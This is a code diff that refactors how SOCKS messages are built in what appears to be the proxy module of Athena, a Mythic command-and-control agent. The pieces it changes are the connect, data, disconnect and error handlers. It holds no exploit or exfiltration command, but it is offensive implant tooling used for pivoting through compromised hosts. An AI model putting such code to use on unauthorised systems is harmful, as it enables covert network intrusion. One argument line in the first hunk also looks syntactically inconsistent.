@@ -23,18 +23,17 @@ namespace Athena.Models.Athena.Socks
                 OnConnected = (c) =>
                 {
                     this.isConnecting = false;
-                    SocksMessage smOut = new SocksMessage() //Put together our Mythic Response
-                    {
+                    SocksMessage smOut = new SocksMessage(
                         server_id = this.server_id,
-                        data = Misc.Base64Encode(new ConnectResponse
+                        new ConnectResponse
                         {
                             bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                             bndport = new byte[] { 0x00, 0x00 },
                             addrtype = co.addressType,
                             status = ConnectResponseStatus.Success,
-                        }.ToByte()),
-                        exit = this.exited
-                    };
+                        }.ToByte(),
+                        this.exited
+                        );
                     HandleSocksEvent(this, new SocksEventArgs(smOut));
                     this.onSocksEvent.Set();
                 },
@@ -42,12 +41,10 @@ namespace Athena.Models.Athena.Socks
                 {
                     byte[] b = c.Buffers;
 
-                    SocksMessage smOut = new SocksMessage
-                    {
-                        server_id = this.server_id,
-                        data = Misc.Base64Encode(c.Buffers),
-                        exit = this.exited
-                    };
+                    SocksMessage smOut = new SocksMessage(
+                        this.server_id, 
+                        c.Buffers, 
+                        this.exited);
 
                     HandleSocksEvent(this, new SocksEventArgs(smOut));
                 },
@@ -59,31 +56,28 @@ namespace Athena.Models.Athena.Socks
                         this.exited = true;
                     }
 
-                    SocksMessage smOut = new SocksMessage
-                    {
-                        server_id = this.server_id,
-                        data = String.Empty,
-                        exit = this.exited
-                    };
+                    SocksMessage smOut = new SocksMessage(
+                        this.server_id, 
+                        new byte[] { }, 
+                        this.exited);
 
                     HandleSocksEvent(this, new SocksEventArgs(smOut));
                 },
                 OnException = (c) =>
                 {
                     this.isConnecting = false;
-                    SocksMessage smOut = new SocksMessage
-                    {
-                        server_id = this.server_id,
-                        data = Misc.Base64Encode(new ConnectResponse
+                    SocksMessage smOut = new SocksMessage(
+                        this.server_id,
+                        new ConnectResponse
                         {
                             bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                             bndport = new byte[] { 0x00, 0x00 },
                             addrtype = co.addressType,
                             status = ConnectResponseStatus.GeneralFailure,
 
-                        }.ToByte()),
-                        exit = this.exited
-                    };
+                        }.ToByte(),
+                        this.exited
+                   );
                     HandleSocksEvent(this, new SocksEventArgs(smOut));
                     this.onSocksEvent.Set();
                 },
